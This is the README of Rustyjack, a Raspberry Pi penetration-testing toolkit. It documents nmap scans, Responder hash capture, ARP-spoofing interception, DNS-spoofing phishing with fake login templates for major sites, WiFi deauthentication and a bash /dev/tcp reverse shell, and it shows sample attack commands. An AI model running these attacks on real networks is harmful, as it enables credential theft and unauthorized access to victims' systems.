<p align="center">
  <img src="https://img.shields.io/badge/platform-Raspberry%20Pi-red?style=flat-square&logo=raspberry-pi">
  <img src="https://img.shields.io/badge/language-Rust-orange?style=flat-square&logo=rust">
  <img src="https://img.shields.io/badge/LCD-ST7735%20128x128-blue?style=flat-square">
  <img src="https://img.shields.io/badge/license-Educational%20Use-green?style=flat-square">
</p>

<div align="center">
  <h1>🦀 Rustyjack</h1>

  <img src="img/rustyjack.bmp" alt="Rustyjack Logo" width="300"/>

  <p>
    <strong>Portable Network Offensive Security Toolkit</strong><br>
    100% Rust • LCD Interface • Raspberry Pi<br>
    <em>Pure Rust offensive security toolkit</em>
  </p>

> ⚠️ **LEGAL DISCLAIMER**
> 
> This tool is for **authorized security testing and educational purposes ONLY**.
> 
> Unauthorized access to computer systems is **ILLEGAL** under:
> - Computer Fraud and Abuse Act (USA)
> - Computer Misuse Act (UK)
> - Similar laws worldwide
> 
> **Always obtain written permission before testing any network or system.**
> 
> The authors accept **NO LIABILITY** for misuse or illegal activities.
> You are **solely responsible** for your actions.

</div>

---

## 📋 Table of Contents

- [What is Rustyjack?](#-what-is-rustyjack)
- [Features](#-features)
- [Hardware Requirements](#-hardware-requirements)
- [Installation](#-installation)
- [Usage](#-usage)
- [Attack Capabilities](#-attack-capabilities)
- [Performance](#-performance)
- [Troubleshooting](#-troubleshooting)
- [Credits](#-credits)

---

## 🎯 What is Rustyjack?

**Rustyjack** is a self-contained offensive security platform that runs on a Raspberry Pi with an LCD screen. It provides penetration testing tools accessible through a simple joystick interface—no keyboard, monitor, or external computer needed.

### What Makes It Special?

- **🦀 100% Rust** - Complete rewrite from Python for speed and reliability
- **📟 Standalone** - LCD screen, buttons, all tools built-in
- **⚡ Fast** - 18 second boot, instant response, low power
- **🔋 Portable** - Pocket-sized, battery-powered option
- **🛡️ Complete** - Recon, MITM, credential capture, phishing, all included

### Architecture

```
┌─────────────────────────────────────────────┐
│         Rustyjack (Pure Rust)               │
├─────────────────────────────────────────────┤
│                                             │
│  rustyjack-ui          rustyjack-core      │
│  (LCD/GPIO)            (Orchestration)      │
│                                             │
│  • ST7735 driver       • Nmap wrapper       │
│  • GPIO buttons        • WiFi manager       │
│  • Menu system         • MITM control       │
│  • Event loop          • Process manager    │
│                                             │
└──────────────┬──────────────────────────────┘
               │ Launches:
     ┌─────────┼─────────┬──────────┐
     │         │         │          │
  ┌──▼──┐  ┌──▼───┐  ┌──▼────┐  ┌─▼────────┐
  │nmap │  │arps  │  │tcpd   │  │Responder │
  │     │  │poof  │  │ump    │  │ (Python) │
  └─────┘  └──────┘  └───────┘  └──────────┘
         External Tools
```

---

## ✨ Features

### 🔍 Network Reconnaissance

**12 Nmap Scan Profiles:**
- **Quick Scan** - Fast TCP scan (~30s)
- **Full Port** - All 65535 ports (~10min)
- **Service Scan** - Version detection (~2min)
- **Vuln Scan** - Vulnerability scripts (~5min)
- **OS Scan** - Operating system detection (~1min)
- **Intensive** - Aggressive, all features (~5min)
- **Stealth SYN** - Evasive SYN scan (~10min)
- **UDP Scan** - UDP top 100 ports (~5min)
- **Ping Sweep** - Host discovery (~30s)
- **Top100** - Most common ports (~1min)
- **HTTP Enum** - Web service enumeration (~2min)
- **Custom** - Your own nmap arguments

**Features:**
- Auto-detect network CIDR
- Interface selection (eth0, wlan0, wlan1)
- Results saved to `/root/Rustyjack/loot/Nmap/`
- Discord webhook integration (auto-upload)

### 🎯 Credential Capture

**Responder (LLMNR/NBT-NS/mDNS Poisoning):**
- Captures Windows authentication hashes
- Supports NTLMv1, NTLMv2, Basic Auth
- Protocols: SMB, HTTP, LDAP, FTP, POP3, IMAP, SMTP
- Results saved to `/root/Rustyjack/Responder/logs/`

**How it works:**
1. Listens for broadcast authentication requests
2. Impersonates requested services
3. Captures credentials when clients connect
4. Logs username + NTLM hash for offline cracking

### 🕵️ Man-in-the-Middle

**MITM & Packet Sniffing:**
- ARP spoofing via `arpspoof`
- Full packet capture via `tcpdump`
- IP forwarding for transparent attacks
- PCAP files saved to `/root/Rustyjack/loot/MITM/`

**Use cases:**
- Intercept HTTP traffic
- Capture cleartext passwords
- Analyze encrypted handshakes
- Monitor network communications

### 🎣 Phishing (DNS Spoofing)

**26+ Pre-built Phishing Templates:**

| Template | Target Site |
|----------|-------------|
| wordpress | WordPress login |
| google | Google account |
| facebook | Facebook login |
| microsoft | Microsoft 365 |
| twitter | Twitter/X |
| instagram | Instagram |
| linkedin | LinkedIn |
| paypal | PayPal |
| apple | Apple ID |
| amazon | Amazon |
| netflix | Netflix |
| dropbox | Dropbox |
| github | GitHub |
| gitlab | GitLab |
| office365 | Office 365 |
| outlook | Outlook webmail |
| yahoo | Yahoo |
| steam | Steam |
| reddit | Reddit |
| pinterest | Pinterest |
| tumblr | Tumblr |
| ebay | eBay |
| craigslist | Craigslist |
| airbnb | Airbnb |
| uber | Uber |
| custom | Your own HTML/PHP |

**Attack flow:**
1. Choose template (e.g., "google")
2. Start DNS spoofing (ettercap)
3. Start web server (PHP)
4. Victim visits site → redirected to Rustyjack
5. Credentials captured to `/root/Rustyjack/DNSSpoof/captures/`

### 📡 WiFi Management

**Features:**
- Scan for WiFi networks (SSID, signal, encryption)
- Save WiFi profiles (SSID + password)
- Auto-connect to saved networks
- Interface switching (wlan0 ↔ wlan1)
- Route control (backup/restore/metrics)
- Dual-dongle support

**Use case:** Use built-in WiFi for internet, USB dongle for attacks.

**Profiles stored:** `/root/Rustyjack/wifi/profiles/*.json`

### 🔄 Reverse Shells

**One-click reverse shell launcher:**
- Default reverse shell (pre-configured IP/port)
- Custom reverse shell (enter IP/port on LCD)
- Uses netcat (`nc`) or bash reverse shell

**Listener setup:**
```bash
# On attacker machine:
nc -lvnp 4444
```

### 💾 Loot Management

**On-device loot viewer:**
- Browse Nmap scan results
- View Responder captures (hashes)
- Read DNS spoof captures (credentials)
- Navigate with LCD buttons

**Discord webhook integration:**
- Automatic upload of Nmap results
- Manual upload of ZIP archives
- Formatted embeds with metadata
- Files up to 25MB

### 🌉 Bridge Mode

**Transparent MITM:**
- Requires 2 network interfaces (eth0 + eth1 or wlan0 + eth1)
- Bridge traffic between networks
- Capture all packets transparently
- No detection by endpoint devices

### 🎨 User Interface

**3 View Modes:**
- **List View** - Classic vertical list (7 items)
- **Grid View** - 2×4 grid (8 items)
- **Carousel View** - Single-item focus with wraparound

**Customization:**
- RGB color themes (background, border, text, selection)
- Save/restore configurations
- Temperature monitoring
- System controls (restart, shutdown, update)

---

## 🛠️ Hardware Requirements

### Required Components

| Item | Specification | Purpose |
|------|---------------|---------|
| **Raspberry Pi** | Zero 2 W (recommended)<br>or Pi 4 / Pi 5 | Main computer |
| **LCD HAT** | Waveshare 1.44" LCD HAT<br>ST7735, 128×128, SPI | Display + buttons |
| **MicroSD Card** | 16GB+ (Class 10) | Operating system |
| **Power Supply** | 5V 2.5A USB-C/Micro-USB | Power |

### Optional Components

| Item | Purpose |
|------|---------|
| **USB WiFi Dongle** | WiFi attacks (see below) |
| **Ethernet HAT** | 3 USB + 1 Ethernet (Pi Zero) |
| **Dual Ethernet HAT** | 2 USB + 2 Ethernet (MITM) |
| **Battery Pack** | Portable power |

### WiFi Attack Requirements

⚠️ **CRITICAL:** The built-in Raspberry Pi WiFi **CANNOT** do WiFi attacks!

**Why:** Broadcom BCM43430 chipset does not support monitor mode or packet injection.

**Solution:** Use external USB WiFi dongle with compatible chipset.

**Recommended Dongles:**

| Model | Chipset | Monitor Mode | Packet Injection | Notes |
|-------|---------|--------------|------------------|-------|
| **Alfa AWUS036ACH** | Realtek RTL8812AU | ✅ | ✅ | Best option, dual-band |
| **TP-Link TL-WN722N v1** | Atheros AR9271 | ✅ | ✅ | **Must be v1** (v2/v3 don't work!) |
| **Panda PAU09** | Realtek RTL8812AU | ✅ | ✅ | Good budget option |
| **Alfa AWUS036NHA** | Atheros AR9271 | ✅ | ✅ | Reliable, widely supported |

**Note:** Always verify chipset before buying! Many sellers ship incompatible versions.

### Pin Configuration

**Waveshare 1.44" LCD HAT Pinout:**

| Component | GPIO Pin | Function |
|-----------|----------|----------|
| LCD Data/Command | GPIO 25 | DC (data/command select) |
| LCD Reset | GPIO 24 | RST (hardware reset) |
| LCD Backlight | GPIO 18 | BL (PWM control) |
| LCD SPI | `/dev/spidev0.0` | Data transfer |
| Joystick Up | GPIO 6 | Button input |
| Joystick Down | GPIO 19 | Button input |
| Joystick Left | GPIO 5 | Button input |
| Joystick Right | GPIO 26 | Button input |
| Joystick Press | GPIO 13 | Center button |
| Key 1 | GPIO 21 | View mode toggle |
| Key 2 | GPIO 20 | Reserved |
| Key 3 | GPIO 16 | Back button |

**All pins configured in:** `/root/Rustyjack/gui_conf.json`

---

## 📥 Installation

### Part 1: Flash Operating System

**1. Download Raspberry Pi Imager**

Download from: https://www.raspberrypi.com/software/

**2. Configure in Imager**

- **Device:** Raspberry Pi Zero 2 W (or your model)
- **OS:** Raspberry Pi OS Lite (32-bit or 64-bit)
- **Settings (⚙️):**
  - Enable SSH
  - Set username: `pi` (or your choice)
  - Set password
  - Configure WiFi (optional)
  - Set hostname: `rustyjack` (optional)

**3. Flash to SD Card**

- Insert microSD card
- Select storage device
- Click "Write"
- Wait for completion (~5 minutes)

**4. Boot Raspberry Pi**

- Insert SD card into Pi
- Connect LCD HAT
- Connect power
- Wait for first boot (~2 minutes)

### Part 2: Install Rustyjack

**1. SSH into Raspberry Pi**

```bash
ssh pi@rustyjack.local
# Or use IP address: ssh pi@192.168.1.XXX
```

**2. Switch to Root User**

```bash
sudo su -
```

**3. Clone Repository**

```bash
cd /root
git clone https://github.com/Iwan-Teague/Rusty-Jack.git Rustyjack
cd Rustyjack
```

**4. Run Installation Script**

```bash
chmod +x install_rustyjack.sh
./install_rustyjack.sh
```

**What it does:**
- ✅ Installs Rust toolchain (rustup)
- ✅ Installs system tools (nmap, tcpdump, arpspoof, ettercap, etc.)
- ✅ Enables SPI and I2C in boot configuration
- ✅ Compiles `rustyjack-core` (orchestration engine)
- ✅ Compiles `rustyjack-ui` (LCD interface)
- ✅ Installs binaries to `/usr/local/bin/`
- ✅ Creates systemd service `rustyjack.service`
- ✅ Sets up directories (`loot/`, `wifi/profiles/`)
- ✅ Starts service automatically

**Time:** ~10-15 minutes (Rust compilation is CPU-intensive)

**5. Reboot**

```bash
reboot
```

**6. Verify Installation**

After reboot (wait ~18 seconds), the LCD should display the Rustyjack menu.

Check service status via SSH:

```bash
systemctl status rustyjack
```

Expected output:
```
● rustyjack.service - Rustyjack UI Service (100% Rust)
   Loaded: loaded (/etc/systemd/system/rustyjack.service; enabled)
   Active: active (running)
   Main PID: 456
```

**View logs:**
```bash
journalctl -u rustyjack -f
```

### Part 3: Configure (Optional)

**Discord Webhook Setup:**

1. Create webhook in Discord (Server → Channel → Integrations → Webhooks)
2. Copy webhook URL
3. Edit file:
   ```bash
   nano /root/Rustyjack/discord_webhook.txt
   ```
4. Paste URL, save, exit
5. Restart service:
   ```bash
   systemctl restart rustyjack
   ```

**WiFi Profile Setup:**

1. On LCD: `WiFi Manager → Scan Networks`
2. Select your network
3. If new, enter password via SSH:
   ```bash
   rustyjack-core wifi profile save \
     --ssid "YourNetwork" \
     --password "YourPassword" \
     --interface auto \
     --auto-connect true
   ```
4. Reconnect via LCD: `WiFi Manager → Saved Profiles → Connect`

### Updating

```bash
cd /root/Rustyjack
git pull
./install_rustyjack.sh
reboot
```

⚠️ **Backup loot before updating:**
```bash
tar -czf ~/loot_backup_$(date +%Y%m%d).tar.gz loot/
```

---

## 🎮 Usage

### Button Controls

| Button | Action |
|--------|--------|
| **↑ Up** | Scroll up / Previous item |
| **↓ Down** | Scroll down / Next item |
| **→ Right** | Select / Enter submenu / Confirm |
| **← Left** | Back / Cancel / Previous menu |
| **○ Select** | Same as Right (center button) |
| **KEY1** | Toggle view mode (List/Grid/Carousel) |
| **KEY2** | Reserved |
| **KEY3** | Alternative back button |

### Menu Structure

```
Main Menu
│
├─ Scan Nmap
│  ├─ Quick Scan
│  ├─ Full Port Scan
│  ├─ Service Scan
│  ├─ Vuln Scan
│  ├─ OS Scan
│  ├─ Intensive Scan
│  ├─ Stealth SYN
│  ├─ UDP Scan
│  ├─ Ping Sweep
│  ├─ Top100 Scan
│  ├─ HTTP Enumeration
│  └─ Custom Nmap
│
├─ Reverse Shell
│  ├─ Default Rev Shell
│  └─ Custom Rev Shell
│
├─ Responder
│  ├─ Responder ON
│  └─ Responder OFF
│
├─ MITM & Sniff
│  ├─ Start MITM
│  └─ Stop MITM
│
├─ DNS Spoofing
│  ├─ Select Site (26+ templates)
│  ├─ Start DNSSpoofing
│  └─ Stop DNS&PHP
│
├─ Network Info
│
├─ WiFi Manager
│  ├─ FAST WiFi Switcher
│  ├─ Scan Networks
│  ├─ Saved Profiles
│  ├─ Interface Config
│  ├─ Status Info
│  └─ Route Control
│
├─ Other Features
│  ├─ Options
│  │  ├─ Colors
│  │  ├─ Save Config
│  │  └─ Refresh Config
│  ├─ System
│  │  ├─ Restart UI
│  │  ├─ System Update
│  │  └─ Shutdown
│  ├─ Upload Discord
│  └─ Browse Images
│
├─ Read File (Loot Viewer)
│  ├─ Nmap
│  ├─ Responder
│  └─ DNSSpoof
│
└─ Bridge Mode
   ├─ Start Bridge
   └─ Stop Bridge
```

### Quick Start Examples

**Run a network scan:**
1. Navigate: `Main Menu → Scan Nmap → Quick Scan`
2. Wait for completion (~30s)
3. View results: `Main Menu → Read File → Nmap`

**Capture credentials:**
1. Navigate: `Main Menu → Responder → Responder ON`
2. Wait for network traffic
3. View captures: `Main Menu → Read File → Responder`
4. Stop when done: `Main Menu → Responder → Responder OFF`

**Launch DNS phishing:**
1. Navigate: `Main Menu → DNS Spoofing → Select Site`
2. Choose template (e.g., `google`)
3. Go back, select: `Start DNSSpoofing`
4. Victims are redirected to fake page
5. View captures: `Main Menu → Read File → DNSSpoof`
6. Stop when done: `Main Menu → DNS Spoofing → Stop DNS&PHP`

---

## 🎯 Attack Capabilities

### 1. Network Reconnaissance (Nmap)

**Purpose:** Discover hosts, open ports, services, vulnerabilities

**Examples:**

```bash
# Quick scan (via rustyjack-core CLI):
rustyjack-core scan run --label "Quick" --nmap-args "-T5 -F"

# Full port scan:
rustyjack-core scan run --label "Full" --nmap-args "-p-"

# Service version detection:
rustyjack-core scan run --label "Service" --nmap-args "-sV"
```

**Output:** `/root/Rustyjack/loot/Nmap/scan_YYYYMMDD_HHMMSS.txt`

**What you get:**
- Open ports
- Running services + versions
- Operating system guesses
- Potential vulnerabilities

### 2. Credential Capture (Responder)

**Purpose:** Capture Windows authentication hashes via protocol poisoning

**Protocols targeted:**
- LLMNR (Link-Local Multicast Name Resolution)
- NBT-NS (NetBIOS Name Service)
- mDNS (Multicast DNS)

**Attack scenario:**
1. User types: `\\fileserver\share` (typo)
2. Windows broadcasts: "Where is fileserver?"
3. Responder answers: "I'm fileserver at 192.168.1.100"
4. User's PC connects and sends credentials
5. Responder captures: `DOMAIN\username:hash`

**Output:** `/root/Rustyjack/Responder/logs/`

**Files:**
- `SMB-NTLMv2-192.168.1.50.txt` - Captured hash
- `Responder-Session.log` - Attack log

**Crack hashes offline:**
```bash
# On a powerful machine:
hashcat -m 5600 captured_hash.txt rockyou.txt
```

### 3. Man-in-the-Middle (MITM)

**Purpose:** Intercept network traffic between two hosts

**Components:**
- **ARP Spoofing** - Redirect traffic through Rustyjack
- **Packet Capture** - Record all traffic
- **IP Forwarding** - Maintain connectivity

**Attack flow:**
1. Scan network for hosts
2. Choose target IP (victim)
3. Start MITM → Rustyjack spoofs ARP to target + gateway
4. All victim traffic flows through Rustyjack
5. tcpdump captures everything to PCAP file

**Output:** `/root/Rustyjack/loot/MITM/*.pcap`

**What you capture:**
- HTTP requests (URLs, cookies, credentials)
- FTP credentials (cleartext)
- Telnet sessions
- DNS queries
- TLS handshakes (decrypt later if possible)

**Analyze:**
```bash
tcpdump -r capture.pcap -A | grep -i "password"
# Or open in Wireshark
```

### 4. DNS Spoofing / Phishing

**Purpose:** Redirect victims to fake login pages

**Attack components:**
- **ettercap** - DNS spoofing (redirect domain → Rustyjack IP)
- **PHP server** - Serve fake login page
- **Phishing template** - Realistic-looking page

**Templates included:**
- 26+ pre-built templates (Google, Facebook, Microsoft, etc.)
- Custom template support (add your own HTML/PHP)

**Attack flow:**
1. Choose template (e.g., `facebook`)
2. Start DNS spoofing:
   - ettercap redirects `facebook.com` → Rustyjack IP
3. Start PHP server:
   - Serves fake Facebook login page
4. Victim visits `facebook.com`
5. DNS redirects to Rustyjack
6. Victim sees fake page, enters credentials
7. Credentials saved to file

**Output:** `/root/Rustyjack/DNSSpoof/captures/*.txt`

**Captured data:**
- Username/email
- Password (cleartext)
- IP address
- User-Agent
- Timestamp

### 5. WiFi Attacks (Requires USB Dongle)

**Scan networks:**
```bash
rustyjack-core wifi scan --interface wlan1
```

**Output:**
```json
{
  "networks": [
    {
      "ssid": "HomeNetwork",
      "bssid": "AA:BB:CC:DD:EE:FF",
      "signal_dbm": -45,
      "channel": 6,
      "encrypted": true
    }
  ]
}
```

**Monitor mode (for aircrack-ng):**
```bash
# Enable monitor mode on USB dongle:
sudo ip link set wlan1 down
sudo iw wlan1 set monitor control
sudo ip link set wlan1 up

# Verify:
iwconfig wlan1
# Should show: Mode:Monitor

# Use aircrack-ng suite:
airodump-ng wlan1
aireplay-ng --deauth 10 -a [AP_MAC] wlan1
```

### 6. Reverse Shell

**Purpose:** Remote command execution on compromised target

**Setup attacker listener:**
```bash
# On your laptop/server:
nc -lvnp 4444
```

**Launch from Rustyjack:**
1. Navigate: `Main Menu → Reverse Shell → Custom Rev Shell`
2. Enter your IP (e.g., `192.168.1.100`)
3. Enter port (e.g., `4444`)
4. Connection established

**What happens:**
```bash
# Rustyjack executes on target:
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1

# You get shell on target:
$ whoami
victim_user
$ id
uid=1000(victim_user) gid=1000(victim_user)
```

### 7. Bridge Mode

**Purpose:** Transparent MITM between two network segments

**Requirements:**
- 2 network interfaces (eth0 + eth1, or wlan0 + eth1)
- Ethernet HAT or USB Ethernet adapter

**Setup:**
1. Connect eth0 to victim network
2. Connect eth1 to internet/router
3. Start Bridge Mode
4. All traffic captured transparently

**Use case:** Insert Rustyjack between network device and network without detection.

---

## 📊 Performance

### Boot Time

| Device | Rust UI |
|--------|---------|
| Raspberry Pi Zero 2 W | ~18 seconds |
| Raspberry Pi 4 (4GB) | ~8 seconds |
| Raspberry Pi 5 (8GB) | ~6 seconds |

### Memory Usage

| Component | RAM |
|-----------|-----|
| rustyjack-ui (idle) | ~12 MB |
| rustyjack-core (idle) | ~5 MB |
| Responder (active) | ~30 MB |
| **Total (idle)** | **~17 MB** |

**Comparison:** Python UI used ~85 MB (83% reduction)

### Response Time

| Action | Time |
|--------|------|
| Button press → LCD update | ~20 ms |
| Menu navigation | ~30 ms |
| Scan launch | ~150 ms |

**Comparison:** Python UI had 50-100ms latency (60% improvement)

### Binary Sizes

| Binary | Size |
|--------|------|
| rustyjack-core | ~5.2 MB |
| rustyjack-ui | ~6.8 MB |
| **Total** | **~12 MB** |

---

## 🐛 Troubleshooting

### LCD Not Working

**Symptom:** Blank, white, or garbled display

**Checks:**
```bash
# 1. SPI enabled?
ls -l /dev/spidev0.0
# Should exist

# 2. Boot config correct?
grep spi /boot/firmware/config.txt
# Should show: dtparam=spi=on

# 3. Service running?
systemctl status rustyjack
```

**Fix:**
```bash
echo "dtparam=spi=on" >> /boot/firmware/config.txt
echo "dtoverlay=spi0-2cs" >> /boot/firmware/config.txt
reboot
```

### Buttons Not Responding

**Symptom:** Pressing buttons does nothing

**Checks:**
```bash
# GPIO device exists?
ls -l /dev/gpiochip0

# Service running as root?
systemctl status rustyjack | grep User
# Should show: User=root
```

**Fix:** Service must run as root (configured by install script)

### Service Won't Start

**Checks:**
```bash
# View errors
journalctl -u rustyjack -xe

# Test binary manually
sudo /usr/local/bin/rustyjack-ui
```

**Fix:**
```bash
# Rebuild from source
cd /root/Rustyjack/rustyjack-ui
cargo build --release
sudo install target/release/rustyjack-ui /usr/local/bin/
sudo systemctl restart rustyjack
```

### WiFi Attacks Fail

**Symptom:** Can't scan networks or capture fails

**Cause:** Using built-in WiFi (doesn't support monitor mode)

**Fix:** Use compatible USB WiFi dongle (see [Hardware Requirements](#hardware-requirements))

**Verify dongle:**
```bash
# List interfaces
iw dev

# Check monitor mode support
iw phy | grep -A 10 "Supported interface modes" | grep monitor
# Should show "* monitor"
```

### Nmap Not Found

**Fix:**
```bash
apt update
apt install -y nmap
```

### Responder Not Capturing

**Checks:**
```bash
# Responder running?
ps aux | grep Responder

# Correct interface?
ip addr show eth0  # or wlan0

# View logs
tail -f /root/Rustyjack/Responder/logs/Responder-Session.log
```

**Common issues:**
- Wrong interface selected
- No network broadcast traffic
- Firewall blocking multicast

### Out of Disk Space

**Clean up:**
```bash
# Remove old logs
journalctl --vacuum-time=7d

# Clean Rust build cache
cd /root/Rustyjack
cd rustyjack-core && cargo clean
cd ../rustyjack-ui && cargo clean

# Archive loot
tar -czf ~/loot_$(date +%Y%m%d).tar.gz loot/
rm -rf loot/*
mkdir -p loot/{Nmap,Responder,DNSSpoof,MITM}
```

---

## 📜 Credits

### Original Project

**Rustyjack** - Created by [@Iwan-Teague](https://github.com/Iwan-Teague)  
Repository: https://github.com/Iwan-Teague/Rusty-Jack.git

### Rust Implementation

**Rustyjack** (2024) - 100% Rust implementation by Rustyjack team

### Contributors

- [@dagnazty](https://github.com/dagnazty) - Testing and feedback
- [@Hosseios](https://github.com/Hosseios) - Hardware verification
- [@m0usem0use](https://github.com/m0usem0use) - Documentation

### External Tools

- **Responder** - Laurent Gaffié ([@lgandx](https://github.com/lgandx/Responder))
- **nmap** - Gordon Lyon (Fyodor)
- **dsniff** (arpspoof) - Dug Song
- **ettercap** - ALoR & NaGA
- **tcpdump** - The Tcpdump Group
- **aircrack-ng** - Thomas d'Otreppe

### Rust Libraries

- **embedded-graphics** - James Waples
- **st7735-lcd** - Various contributors
- **gpio-cdev** - posborne
- **clap** - Kevin K.
- **serde** - David Tolnay

---

## 📄 License

**Educational and Authorized Testing Only**

This software is provided for:
- ✅ Security education and research
- ✅ Authorized penetration testing
- ✅ CTF competitions
- ✅ Personal lab environments

This software is **NOT** for:
- ❌ Unauthorized access
- ❌ Malicious activities
- ❌ Breaking laws
- ❌ Causing harm

**You are solely responsible for your use of this tool.**

**The authors provide NO WARRANTY and accept NO LIABILITY for misuse.**

---

## ⚠️ Legal Warning

```
╔═══════════════════════════════════════════════════════╗
║                                                       ║
║   ⚠️  UNAUTHORIZED ACCESS IS A FEDERAL CRIME  ⚠️      ║
║                                                       ║
║   Violating computer security laws can result in:    ║
║   • Heavy fines ($100,000+)                          ║
║   • Prison sentences (up to 20 years)                ║
║   • Permanent criminal record                        ║
║   • Civil lawsuits                                   ║
║                                                       ║
║   ALWAYS obtain written permission before testing.   ║
║                                                       ║
╚═══════════════════════════════════════════════════════╝
```

---

<div align="center">

**🦀 Rustyjack - Portable Offensive Security 🦀**

*Built with Rust • Powered by Raspberry Pi • Made for Security Professionals*

⚠️ **Beverage Warning:** Coffee, soda, and other liquids can cause permanent damage if spilled on this device.  
Keep all beverages away from Rustyjack. We are not liable for liquid damage.

**Star this repo if you find it useful!** ⭐

</div>
